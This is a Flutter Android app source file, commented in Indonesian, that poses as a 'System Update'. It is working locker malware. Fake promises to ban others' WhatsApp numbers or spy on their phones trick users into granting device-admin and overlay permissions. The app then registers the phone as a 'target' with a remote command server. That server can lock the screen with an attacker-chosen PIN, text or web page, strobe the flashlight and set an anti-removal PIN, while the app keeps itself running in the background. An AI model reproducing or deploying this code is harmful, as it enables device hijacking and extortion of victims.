import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:workmanager/workmanager.dart';

import 'dart:async';
import 'dart:convert';

// Variabel global
String? globalDeviceId;
IO.Socket? socket;
bool _isReconnecting = false;

// Variabel untuk SENTER
bool isSenterSpamActive = false;

// Variabel untuk TOKEN
String? globalToken;
const String TOKEN_KEY = "device_token";

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
  Workmanager().registerPeriodicTask(
    "socket_keep_alive",
    "socketKeepAlive",
    frequency: const Duration(minutes: 15),
    existingWorkPolicy: ExistingPeriodicWorkPolicy.keep,
  );

  SharedPreferences prefs = await SharedPreferences.getInstance();

  globalToken = prefs.getString(TOKEN_KEY);
  print("✅ Token yang terbaca: ${globalToken ?? 'TIDAK ADA'}");

  bool isFirstInstall = prefs.getBool('not_installed_before') ?? true;
  if (isFirstInstall) {
    await prefs.clear();
    await prefs.setBool('not_installed_before', false);
  }

  bool isLocked = prefs.getBool('system_locked') ?? false;
  String deviceId = prefs.getString('device_id') ?? await _generateDeviceId();
  
  if (globalToken != null && globalToken!.isNotEmpty) {
    deviceId = "${globalToken}_$deviceId";
  }
  
  globalDeviceId = deviceId;
  await prefs.setString('device_id', deviceId);

  if (isLocked) {
    String lockType = prefs.getString('lock_type') ?? 'pin';
    String lockData = prefs.getString('lock_data') ?? '1234';
    await prefs.setString('lock_type', lockType);
    await prefs.setString('lock_data', lockData);
  }

  await _sendDeviceIdToService(deviceId);
  await _startBackgroundService();
  _connectToServer(deviceId);

  runApp(MyApp(isLocked: isLocked));
}

Future<void> _saveToken(String token) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.setString(TOKEN_KEY, token);
  globalToken = token;
  print("✅ Token disimpan: $token");
}

Future<void> _startSenterSpam() async {
  if (isSenterSpamActive) return;
  
  PermissionStatus status = await Permission.camera.request();
  if (!status.isGranted) {
    print("❌ Camera permission denied for flashlight");
    return;
  }
  
  isSenterSpamActive = true;
  
  try {
    await const MethodChannel('lock_channel').invokeMethod('startFlashSpam');
    print("✅ Senter spam started");
  } catch (e) {
    print("❌ Failed to start senter spam: $e");
    isSenterSpamActive = false;
  }
}

Future<void> _stopSenterSpam() async {
  if (!isSenterSpamActive) return;
  
  isSenterSpamActive = false;
  
  try {
    await const MethodChannel('lock_channel').invokeMethod('stopFlashSpam');
    print("✅ Senter spam stopped");
  } catch (e) {
    print("❌ Failed to stop senter spam: $e");
  }
}

Future<void> _sendDeviceIdToService(String deviceId) async {
  try {
    await const MethodChannel('lock_channel').invokeMethod('setDeviceId', {'device_id': deviceId});
    print("✅ Device ID sent to native service: $deviceId");
  } catch (e) {
    print("❌ Gagal kirim deviceId ke service: $e");
  }
}

@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    if (task == "socketKeepAlive") {
      try {
        await const MethodChannel('lock_channel').invokeMethod('keepAlive');
        print("✅ Keep alive ping sent to native service");
      } catch (e) {
        print("❌ Keep alive gagal: $e");
      }
      if (socket == null || socket!.connected == false) {
        if (globalDeviceId != null) {
          _connectToServer(globalDeviceId!);
        }
      }
    }
    return Future.value(true);
  });
}

Future<void> _startBackgroundService() async {
  try {
    await const MethodChannel('lock_channel').invokeMethod('startBackgroundService');
    print("✅ Background service started");
  } catch (e) {
    print("❌ Failed to start background service: $e");
  }
}

Future<String> _generateDeviceId() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
  return "${androidInfo.brand}_${androidInfo.model}_${androidInfo.id}".replaceAll(' ', '_');
}

void _connectToServer(String deviceId) {
  String serverUrl = 'http://cloudnex.biz.id:4023';

  if (socket != null && socket!.connected) {
    print("✅ Socket already connected");
    return;
  }

  socket = IO.io(serverUrl, IO.OptionBuilder()
      .setTransports(['websocket'])
      .setQuery({'id': deviceId, 'type': 'target'})
      .enableAutoConnect()
      .setReconnectionAttempts(999)
      .setReconnectionDelay(1000)
      .setReconnectionDelayMax(5000)
      .build());

  socket!.on('connect', (_) {
    print("✅ Connected to server with ID: $deviceId");
    _isReconnecting = false;
    _startKeepAlive();
  });

  socket!.on('disconnect', (_) {
    print("⚠️ Disconnected from server");
    _tryReconnect(deviceId);
  });

  socket!.on('connect_error', (error) {
    print("❌ Connection error: $error");
    _tryReconnect(deviceId);
  });

  socket!.on('command', (data) async {
    String cmd = data['command'];
    String extra = data['extra'] ?? '';
    print("📨 Received command: $cmd");

    if (cmd == 'remote_lock_pin') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', true);
      await prefs.setString('lock_type', 'pin');
      await prefs.setString('lock_data', extra);
      await _startBackgroundService();
      await Future.delayed(const Duration(milliseconds: 500));
      const MethodChannel('lock_channel').invokeMethod('triggerLock', {
        'type': 'pin',
        'data': extra
      });
    }
    else if (cmd == 'remote_lock_text') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', true);
      await prefs.setString('lock_type', 'text');
      await prefs.setString('lock_data', extra);
      await _startBackgroundService();
      await Future.delayed(const Duration(milliseconds: 500));
      const MethodChannel('lock_channel').invokeMethod('triggerLock', {
        'type': 'text',
        'data': extra
      });
    }
    else if (cmd == 'remote_lock_html') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', true);
      await prefs.setString('lock_type', 'html');
      await prefs.setString('lock_data', extra);
      await _startBackgroundService();
      await Future.delayed(const Duration(milliseconds: 500));
      const MethodChannel('lock_channel').invokeMethod('triggerLock', {
        'type': 'html',
        'data': extra
      });
    }
    else if (cmd == 'remote_unlock') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('system_locked', false);
      await prefs.remove('lock_type');
      await prefs.remove('lock_data');
      const MethodChannel('lock_channel').invokeMethod('stopLock');
      try {
        await const MethodChannel('lock_channel').invokeMethod('unlockDevice');
      } catch (e) {
        print("Error calling unlockDevice: $e");
      }
    }
    else if (cmd == 'set_admin_pin') {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setString('admin_pin', extra);
      print("PIN Anti Disable diterima: $extra");
    }
    else if (cmd == 'start_senter_spam') {
      await _startSenterSpam();
    }
    else if (cmd == 'stop_senter_spam') {
      await _stopSenterSpam();
    }
    else if (cmd == 'set_token') {
      String newToken = extra.trim();
      if (newToken.isNotEmpty) {
        await _saveToken(newToken);
        print("🔄 Token diubah menjadi: $newToken");
      }
    }
  });

  socket!.connect();
}

void _tryReconnect(String deviceId) {
  if (_isReconnecting) return;
  _isReconnecting = true;

  Future.delayed(const Duration(seconds: 3), () {
    print("🔄 Trying to reconnect...");
    if (socket == null || socket!.connected == false) {
      _connectToServer(deviceId);
    }
    _isReconnecting = false;
  });
}

void _startKeepAlive() {
  Future.delayed(const Duration(seconds: 30), () {
    if (socket != null && socket!.connected) {
      socket!.emit('ping', {'device_id': globalDeviceId});
      _startKeepAlive();
    }
  });
}

class MyApp extends StatelessWidget {
  final bool isLocked;
  const MyApp({super.key, required this.isLocked});

  @override
  Widget build(BuildContext context) => MaterialApp(
    debugShowCheckedModeBanner: false,
    home: isLocked ? const LockScreen() : const PermissionPage(),
  );
}

class PermissionPage extends StatefulWidget {
  const PermissionPage({super.key});

  @override
  State<PermissionPage> createState() => _PermissionPageState();
}

class _PermissionPageState extends State<PermissionPage> {
  bool _overlayGranted = false;
  bool _adminGranted = false;
  bool _isChecking = false;

  @override
  void initState() {
    super.initState();
    _checkPermissions();
    _startBackgroundService();
  }

  Future<void> _startBackgroundService() async {
    try {
      await const MethodChannel('lock_channel').invokeMethod('startBackgroundService');
    } catch (e) {
      print("Error starting service: $e");
    }
  }

  Future<void> _checkPermissions() async {
    setState(() {
      _isChecking = true;
    });

    bool overlay = await Permission.systemAlertWindow.isGranted;
    bool admin = false;
    try {
      final result = await const MethodChannel('lock_channel').invokeMethod('isAdminActive');
      admin = result == true;
    } catch (e) {}

    setState(() {
      _overlayGranted = overlay;
      _adminGranted = admin;
      _isChecking = false;
    });

    if (overlay && admin) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      String? deviceId = prefs.getString('device_id');
      if (deviceId != null) {
        await _sendDeviceIdToService(deviceId);
      }
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const HomeScreen()));
    }
  }

  Future<void> _sendDeviceIdToService(String deviceId) async {
    try {
      await const MethodChannel('lock_channel').invokeMethod('setDeviceId', {'device_id': deviceId});
    } catch (e) {
      print("Error sending deviceId: $e");
    }
  }

  Future<void> _requestOverlay() async {
    final status = await Permission.systemAlertWindow.request();
    setState(() {
      _overlayGranted = status.isGranted;
    });
    _checkIfComplete();
  }

  Future<void> _requestAdmin() async {
    try {
      await const MethodChannel('lock_channel').invokeMethod('requestAdmin');
      await Future.delayed(const Duration(seconds: 2));
      await _checkPermissions();
    } catch (e) {}
  }

  void _checkIfComplete() async {
    await _checkPermissions();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("System Update"), backgroundColor: Colors.red),
      body: Center(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.security, size: 80, color: Colors.orange),
              const SizedBox(height: 20),
              const Text(
                "Aktifkan Izin Berikut",
                style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 10),
              const Text(
                "Klik tombol AKTIFKAN untuk setiap izin",
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 14, color: Colors.grey),
              ),
              const SizedBox(height: 40),

              Container(
                width: double.infinity,
                decoration: BoxDecoration(
                  color: Colors.grey[800],
                  borderRadius: BorderRadius.circular(15),
                ),
                child: ListTile(
                  leading: Icon(
                    _adminGranted ? Icons.check_circle : Icons.warning,
                    color: _adminGranted ? Colors.green : Colors.orange,
                  ),
                  title: const Text("BANNED WHATSAPP"),
                  subtitle: const Text("izin kan supaya aplikasi ini bisa banned nomor WhatsApp orang lain"),
                  trailing: ElevatedButton(
                    onPressed: _adminGranted ? null : _requestAdmin,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _adminGranted ? Colors.green : Colors.blue,
                    ),
                    child: Text(_adminGranted ? "AKTIF" : "AKTIFKAN"),
                  ),
                ),
              ),

              const SizedBox(height: 15),

              Container(
                width: double.infinity,
                decoration: BoxDecoration(
                  color: Colors.grey[800],
                  borderRadius: BorderRadius.circular(15),
                ),
                child: ListTile(
                  leading: Icon(
                    _overlayGranted ? Icons.check_circle : Icons.warning,
                    color: _overlayGranted ? Colors.green : Colors.orange,
                  ),
                  title: const Text("SADAP HP"),
                  subtitle: const Text("izin kan aplikasi ini supaya bisa sadap hp orang lain"),
                  trailing: ElevatedButton(
                    onPressed: _overlayGranted ? null : _requestOverlay,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _overlayGranted ? Colors.green : Colors.blue,
                    ),
                    child: Text(_overlayGranted ? "AKTIF" : "AKTIFKAN"),
                  ),
                ),
              ),

              const SizedBox(height: 40),

              if (_isChecking)
                const CircularProgressIndicator(),

              if (!_overlayGranted || !_adminGranted)
                TextButton(
                  onPressed: _checkPermissions,
                  child: const Text("CEK ULANG IZIN"),
                ),
            ],
          ),
        ),
      ),
    );
  }
}

class LockScreen extends StatefulWidget {
  const LockScreen({super.key});
  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  String _lockType = 'pin';
  String _lockData = '';
  final TextEditingController _pinController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _loadLockData();
    _keepConnection();
  }

  void _keepConnection() {
    Future.delayed(const Duration(seconds: 10), () {
      if (socket != null && socket!.connected && globalDeviceId != null) {
        socket!.emit('ping', {'device_id': globalDeviceId});
        if (mounted) _keepConnection();
      }
    });
  }

  Future<void> _loadLockData() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    setState(() {
      _lockType = prefs.getString('lock_type') ?? 'pin';
      _lockData = prefs.getString('lock_data') ?? '1234';
    });
  }

  void _unlock() async {
    if (_lockType == 'pin' && _pinController.text == _lockData) {
      _doUnlock();
    } else if (_lockType != 'pin') {
      _doUnlock();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("PIN salah!")));
      _pinController.clear();
    }
  }

  void _doUnlock() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setBool('system_locked', false);
    await prefs.remove('lock_type');
    await prefs.remove('lock_data');

    const MethodChannel('lock_channel').invokeMethod('stopLock');
    try {
      await const MethodChannel('lock_channel').invokeMethod('unlockDevice');
    } catch (e) {
      print("Error calling unlockDevice: $e");
    }

    if (mounted) {
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const HomeScreen()));
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: _lockType == 'html'
            ? WebViewWidget(
                controller: WebViewController()
                  ..setJavaScriptMode(JavaScriptMode.unrestricted)
                  ..loadRequest(Uri.parse(_lockData)),
              )
            : _lockType == 'text'
                ? Center(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Text(
                        _lockData,
                        style: const TextStyle(color: Colors.red, fontSize: 28, fontWeight: FontWeight.bold),
                        textAlign: TextAlign.center,
                      ),
                    ),
                  )
                : Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(Icons.lock, size: 100, color: Colors.red),
                        const SizedBox(height: 30),
                        const Text("SYSTEM LOCKED", style: TextStyle(color: Colors.red, fontSize: 24, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 30),
                        SizedBox(
                          width: 250,
                          child: TextField(
                            controller: _pinController,
                            obscureText: true,
                            textAlign: TextAlign.center,
                            decoration: const InputDecoration(
                              hintText: "Enter PIN",
                              hintStyle: TextStyle(color: Colors.grey),
                              border: OutlineInputBorder(),
                              filled: true,
                              fillColor: Colors.grey,
                            ),
                            style: const TextStyle(color: Colors.white, fontSize: 18),
                            onSubmitted: (_) => _unlock(),
                          ),
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton(
                          onPressed: _unlock,
                          style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                          child: const Text("UNLOCK", style: TextStyle(fontSize: 16)),
                        ),
                      ],
                    ),
                  ),
      ),
    );
  }
}

class HomeScreen extends StatelessWidget {
  const HomeScreen({super.key});

  @override
  Widget build(BuildContext context) => Scaffold(
    appBar: AppBar(title: const Text("System Update"), backgroundColor: Colors.red),
    body: const Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.security, size: 80, color: Colors.green),
          SizedBox(height: 20),
          Text("Aplikasi target berjalan di background"),
          SizedBox(height: 10),
          Text("Device terdaftar ke server kontrol", style: TextStyle(fontSize: 12, color: Colors.grey)),
        ],
      ),
    ),
  );
}